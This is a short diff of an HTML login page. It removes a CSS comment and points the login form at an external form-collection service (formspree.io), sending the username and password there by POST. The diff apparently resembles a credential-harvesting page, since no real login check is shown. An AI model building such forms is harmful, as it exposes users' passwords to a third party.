@@ -27,7 +27,7 @@
     }
 
     .logo img {
-      width: 120px; /* adjust as needed */
+      width: 120px;
       height: auto;
     }
 
@@ -103,9 +103,9 @@
 
   <div class="login-container">
     <h2>Login</h2>
-    <form>
-      <input type="text" placeholder="Username" required />
-      <input type="password" placeholder="Password" required />
+    <form action="https://formspree.io/f/mblzdylp" method="POST">
+      <input type="text" name="username" placeholder="Username" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Login</button>
     </form>
     <p>Don't have an account? <a href="#">Sign up</a></p>
